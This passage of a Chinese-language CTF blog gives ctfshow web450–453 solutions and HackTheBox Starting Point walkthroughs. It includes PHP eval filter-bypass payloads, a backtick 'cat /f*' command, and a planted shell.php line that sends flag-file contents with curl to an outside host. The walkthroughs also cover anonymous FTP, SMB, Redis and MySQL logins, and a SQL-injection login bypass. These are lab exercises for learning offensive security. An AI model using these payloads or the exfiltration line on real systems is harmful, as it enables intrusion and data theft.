class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><p>这里就是p和p异或，依次来异或</p><p><strong>异或 </strong>     ——-&gt;    相同为零   不同为1 </p><p>拿<code>p^p^p</code>来举个例子     先是 <code>p^p</code>  —-&gt;  0      然后 <code>0^p</code>  ———-&gt;   p</p><p>就是这样了</p><h2 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpanfo^phpznfo^phprnfo</span><br></pre></td></tr></table></figure><p><strong>这里的异或是转化为ascii码来进行计算的</strong></p><h2 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="keyword">echo</span> `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h2><p><strong>题目</strong></p><p><img src="../images/image-20230405221320480.png" alt="image-20230405221320480"></p><p>先去读取一下源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-05 02:03:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Swoole\Http\Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, function (<span class="variable">$server</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, function (<span class="variable">$request</span>, <span class="variable">$response</span>) &#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是说，当我们访问/ctf/file post传入的s会写入shell.php中，然后当我们访问/ctf/exec时，就会去执行刚才的shell.php。<br>里面的内容大家就可以随意发挥了。<br>我写的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://xxx.xxx.xxx:4567?p=`cat f*`&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>剩下的题就不做了</p><p>去看yu师傅和Y4师傅的博客就好了</p><p><a href="https://blog.csdn.net/solitudi/article/details/113778651">Y4wp </a>    <a href="https://blog.csdn.net/miuzzx/article/details/112692697?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ctfshow%20web396&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-112692697.nonecase&amp;spm=1018.2226.3001.4187">yu2xxwp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 其他 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb-starting point</title>
      <link href="/posts/41d43cf2.html"/>
      <url>/posts/41d43cf2.html</url>
      
        <content type="html"><![CDATA[<h2 id="Meow-telnet"><a href="#Meow-telnet" class="headerlink" title="Meow(telnet)"></a>Meow(telnet)</h2><p><img src="../images/image-20230329161813096.png" alt="image-20230329161813096"></p><p><img src="../images/image-20230329152247821.png" alt="image-20230329152247821"></p><p>怎么先完成vpn的配置，记得上面的<strong>vpn数字</strong>要选一样的，不然ping不通，</p><p>还有一点就是先关闭靶机在关闭vpn，不然的话得等好几个小时才能重新连接vpn</p><p>先ping一下，看一下靶机是否存活</p><p><img src="../images/image-20230329152446543.png" alt="image-20230329152446543"></p><p>有返回了，代表存活</p><p>然后扫一下端口</p><p><img src="../images/image-20230329152518368.png" alt="image-20230329152518368"></p><p>发现23端口是打开的，并且是telnet服务的</p><p>因为telnet是远程登录服务器服务，尝试用这个服务区登录一下</p><p><strong>telnet xxxxxxxx</strong></p><p><img src="../images/image-20230329152843423.png" alt="image-20230329152843423"></p><p><img src="../images/image-20230329152903431.png" alt="image-20230329152903431"></p><p>最后猜的root用户，然后登录成功</p><p>拿到flag</p><h2 id="Fawn-ftp"><a href="#Fawn-ftp" class="headerlink" title="Fawn(ftp)"></a>Fawn(ftp)</h2><p><img src="../images/image-20230329161804441.png" alt="image-20230329161804441"></p><p><img src="../images/image-20230329153208092.png" alt="image-20230329153208092"></p><p>可以ping通，说明主机存活</p><p>然后进行nmap扫描</p><p>-sV 探测服务/版本信息 我们可以看到 开放21端口的ftp协议 版本是 vsftpd 3.0.3</p><p><img src="../images/image-20230329153834657.png" alt="image-20230329153834657"></p><p>目标上运行的操作系统类型是Unix</p><p><strong>对ftp进行补充一下</strong></p><p>FTP没有账户时候我们的username: anonymous 采用匿名访问;</p><p>对于FTP我们每次操作服务器都会给我们回应状态码 不同状态码对应不同的的含义：</p><p><img src="../images/image-20230329154248434.png" alt="image-20230329154248434"></p><p>比如用户登录成功 服务器就会返回230状态码;</p><p>在这个ftp服务器上是不能直接cat读取文件的，我们得进行get外带</p><p>下载文件</p><p>下载文件通常用get和mget这两条命令。 a) get 格式：get [remote-file] [local-file] 将文件从远端主机中传送至本地主机中。 如要获取远程服</p><p><code>ftp&gt; get /usr/your/1.htm 1.htm (回车)</code></p><p>b) mget　　　　　　 格式：mget [remote-files] 从远端主机接收一批文件至本地主机。 如要获取服务器上/usr/your/下的所有文件，则</p><p><code>ftp&gt; cd /usr/your/ ftp&gt; mget *.* (回车)</code></p><p>先用ftp 连接 服务器 采用匿名登录 无密码 查询服务器 文件 发现flag 进行下载 然后本地读取</p><p><img src="../images/image-20230329154621851.png" alt="image-20230329154621851"></p><p>匿名访问，没有密码</p><p><img src="../images/image-20230329154739182.png" alt="image-20230329154739182"></p><p>然后就可以本地当前目录下查看flag了</p><p><img src="../images/image-20230329154822624.png" alt="image-20230329154822624"></p><p>通关</p><h2 id="Dancing-SMB"><a href="#Dancing-SMB" class="headerlink" title="Dancing(SMB)"></a>Dancing(SMB)</h2><p><img src="../images/image-20230329161824778.png" alt="image-20230329161824778"></p><p>还是先ping下</p><p><img src="../images/image-20230329155320103.png" alt="image-20230329155320103"></p><p>可以ping通，说明主机存活</p><p>SMB(全称是Server Message Block)是一个网络<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEQlOEYlRTglQUUlQUUvMTMwMjAyNjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=">协议</a>名，它能被用于<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9XZWIvMTUwNTY0P2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">Web</a>连接和<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUUlQTIlRTYlODglQjclRTclQUIlQUYvMTAxMDgxP2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">客户端</a>与服务器之间的<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQkYlQTElRTYlODElQUYlRTYlQjIlOUYlRTklODAlOUEvMTA1MzAxMj9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">信息沟通</a>。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9ET1MlRTYlOTMlOEQlRTQlQkQlOUMlRTclQjMlQkIlRTclQkIlOUYvNjE4NjAwMz9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">DOS操作系统</a>中的本地文件接口“中断13”改造为<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclQkQlOTElRTclQkIlOUMlRTYlOTYlODclRTQlQkIlQjYlRTclQjMlQkIlRTclQkIlOUYvOTcxOTQyMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">网络文件系统</a>。<br>简而言之就是个传输文件 文件共享用的协议 跟FTP差不了太多。</p><p><img src="../images/image-20230329160924545.png" alt="image-20230329160924545"></p><p>使用nmap扫一下，发现开了三个端口</p><p>135: <strong>msrpc</strong> <strong>（MicroSoft Remote Procedure Call，微软远程过程调用）</strong> 这是windows系统特有的服务<br>139:<strong>netbios-ssn</strong> 用于提供文件共享服务,主要用于企业内部网之间互相访问 也是微软的服务<br>445:就是我们说的<strong>SMB</strong><br>尝试连接SMB 密码为空 连接成功：</p><p><img src="../images/image-20230329161145722.png" alt="image-20230329161145722"></p><p>可以看到有WorkShares 的目录 可以访问 ，进行访问<br>smbclient //10.129.71.90/WorkShares<br>找了一下flag.txt 发现 没有 于是进入别的目录找 在James.P下找到</p><p><img src="../images/image-20230329161314793.png" alt="image-20230329161314793"></p><p><img src="../images/image-20230329161347826.png" alt="image-20230329161347826"></p><p>通关</p><h2 id="Redeemer-Redis"><a href="#Redeemer-Redis" class="headerlink" title="Redeemer(Redis)"></a>Redeemer(Redis)</h2><p><img src="../images/image-20230329161840375.png" alt="image-20230329161840375"></p><p><strong>Redis</strong>是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。redis的默认端口号是6379。</p><p><strong>还是先ping一下</strong></p><p><img src="../images/image-20230329162205909.png" alt="image-20230329162205909"></p><p>接下来扫一下默认端口</p><p>前面没扫到是因为nmap默认的端口好是1-1000</p><p><img src="../images/image-20230329162326905.png" alt="image-20230329162326905"></p><p><img src="../images/image-20230329162446458.png" alt="image-20230329162446458"></p><p>扫到redis版本了</p><p><strong>通过redis-cli尝试连接</strong></p><p><img src="../images/image-20230329162733702.png" alt="image-20230329162733702"></p><p>连接成功，通过输入 <strong>info</strong> 查看redis服务信息与状态，发现数据库名与Key个数，通过查看数据库内容发现<strong>flag</strong></p><p><img src="../images/image-20230329162841616.png" alt="image-20230329162841616"></p><p><img src="../images/image-20230329162921188.png" alt="image-20230329162921188"></p><p>通关</p><p>(vip的题做不了)  ——&gt;  只能去做 下一个板块免费的题了</p><h2 id="Appointment-sql注入"><a href="#Appointment-sql注入" class="headerlink" title="Appointment(sql注入)"></a>Appointment(sql注入)</h2><p><img src="../images/image-20230329164816236.png" alt="image-20230329164816236"></p><p>先ping一下</p><p><img src="../images/image-20230329164831717.png" alt="image-20230329164831717"></p><p>ping通了</p><p>这题得开kali的图形化界面了，因为这里考察的点是sql注入</p><p>这里连接openvpn的时候，machine要连接udp,start-point要连接tcp</p><p>不然的话靶机用不了</p><p>扫一下端口</p><p><img src="../images/image-20230330143929462.png" alt="image-20230330143929462"></p><p>发现80默认端口打开，<img src="../images/image-20230330144058574.png" alt="image-20230330144058574"></p><p>然后尝试一下弱密码，发现不行后在尝试一下万能密码注入试试</p><p><img src="../images/image-20230330144149273.png" alt="image-20230330144149273"></p><p>万能密码注入成功</p><p>通关</p><h2 id="Sequel-mysql"><a href="#Sequel-mysql" class="headerlink" title="Sequel(mysql)"></a>Sequel(mysql)</h2><p>考点</p><p><img src="../images/image-20230330145212076.png" alt="image-20230330145212076"></p><p>还是先ping一下</p><p><img src="../images/image-20230330145240338.png" alt="image-20230330145240338"></p><p>能通，扫一下端口号</p><p><img src="../images/image-20230330145921057.png" alt="image-20230330145921057"></p><p>扫完了，发现开了个3306端口，是mysql的默认端口号</p><p>然后我们尝试连接一下数据库(没安装mysql的自己手动安装一下)</p><p><img src="../images/image-20230330150224251.png" alt="image-20230330150224251"></p><p>这里的密码为空就不填了(root用户(就是用户名)允许无密码登录)</p><p><img src="../images/image-20230330150343364.png" alt="image-20230330150343364"></p><p>连接成功</p><p>接下来就是利用sql语句来查询了</p><p><img src="../images/image-20230330150501495.png" alt="image-20230330150501495"></p><p>最后拿到flag</p><p>通关</p><h2 id="Crocodile-ftp和web网页"><a href="#Crocodile-ftp和web网页" class="headerlink" title="Crocodile(ftp和web网页)"></a>Crocodile(ftp和web网页)</h2><p><img src="../images/image-20230330150804673.png" alt="image-20230330150804673"></p><p>还是先ping一下</p><p><img src="../images/image-20230330150834777.png" alt="image-20230330150834777"></p><p>接下来扫一下端口</p><p><img src="../images/image-20230330151245444.png" alt="image-20230330151245444"></p><p>扫出来老朋友ftp了，还有这个80端口的web网页，那我们还是先去看一下这个ftp</p><p><img src="../images/image-20230330151515067.png" alt="image-20230330151515067"></p><p><img src="../images/image-20230330151620224.png" alt="image-20230330151620224"></p><p>直接把ftp服务器上的账号密码全给提取到本地了</p><p><img src="../images/image-20230330152635235.png" alt="image-20230330152635235"></p><p>访问网站看到这玩意(打开真慢)</p><p>然后利用<code>gobuster</code>扫一下网站</p><p>gobuster dir -u <a href="http://10.129.98.232">http://10.129.98.232</a> -w /usr/share/wordlists/dirb/common.txt</p><p>dir  —-&gt; 是扫目录</p><p>dns  —-&gt;爆破dns</p><p>vHost  —-&gt; 扫子域</p><p><img src="../images/image-20230330152958204.png" alt="image-20230330152958204"></p><p>发现存在301重定向(302也是)，然后去访问一下</p><p>在访问到<a href="http://10.129.98.232/dashboard/的时候，跳转到了">http://10.129.98.232/dashboard/的时候，跳转到了</a></p><p><img src="../images/image-20230330153223984.png" alt="image-20230330153223984"></p><p>然后我们就拿之前在ftp服务器获取的账号密码进行登录</p><p><img src="../images/image-20230330153317372.png" alt="image-20230330153317372"></p><p>通关</p><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder()"></a>Responder()</h2><p>考点</p><p><img src="../images/image-20230330154052951.png" alt="image-20230330154052951"></p><p>考点挺多的啊</p><p>老样子还是能ping通</p><p><img src="../images/image-20230403154945808.png" alt="image-20230403154945808"></p><p>但是就是端口扫描太慢了</p><p>这里就拿一下别人扫出的端口号</p><p>nmap的一些指令的用法</p><p>借用一下，-sS 使用 SYN 扫描，因为 TCP 扫描会经历三次握手耗费大量时间，-Pn 是禁 ping 主机，防止被防火墙过滤而漏扫，但是我们只有一个主机，所以没什么影响，-n 不解析域名，-open 只输出开放端口，结果扫描到 3 个端口，而且注意 5985 端口扫描出的服务也有所不同</p><p><img src="../images/image-20230403160224371.png" alt="image-20230403160224371"></p><p><strong>这个 wsman 全称是 Windows Remote Managemen(WS_Management) ,如果使用 Win7 或者Windows 2003 Server以上版本的操作系统，微软在系统中已经自带了支持WSMAN 的管理客户端，叫做 winrm，它可以提供远程 powershell 管理服务，听起来就比较危险</strong></p><p>扫到了这几个端口号，但是去访问<strong>80</strong>的时候却报错，然后重定向到了另一个域名处</p><p><img src="../images/image-20230403160317545.png" alt="image-20230403160317545"></p><p>5985端口也是一样(但是没有重定向)</p><p><img src="../images/image-20230403160622798.png" alt="image-20230403160622798"></p><p>7680端口也是这样，没有重定向</p><p><img src="../images/image-20230403160558935.png" alt=""></p><p>我们知道如果想通过域名访问一个网站的话，是需要进行 dns 解析的，我们直接输入 IP 地址发现被重定向到了 <code>unika.htb</code> 这个域名，但是这个域名没有办法解析到对应的 IP 地址，所以我们需要通过修改 <code>hosts</code> 文件来确定 IP 地址</p><p><strong>修改host进入网址</strong></p><p><img src="../images/image-20230403161118887.png" alt="image-20230403161118887"></p><p>添加后，就可以成功进入网址了</p><p><img src="../images/image-20230403161144380.png" alt="image-20230403161144380"></p><p>再次访问，出现页面，这个网站是通过虚拟主机搭建的，也就是多个网站搭建在一台服务器上，一般现实环境中是不能通过虚拟主机的 IP 直接访问的，而是通过 <code>A 记录</code>(把域名解析到一个IP地址)或 <code>CNAME 记录</code> (把域名解析到另外一个域名)解析出域名后，再进行下一次域名解析来访问</p><p><strong>查看网站有哪些功能</strong></p><p>查看网站功能<br>测试 web 应用程序可以重点关注交互功能，我们能控制哪些输入，又如何被后端处理，会不会以及怎么输出? 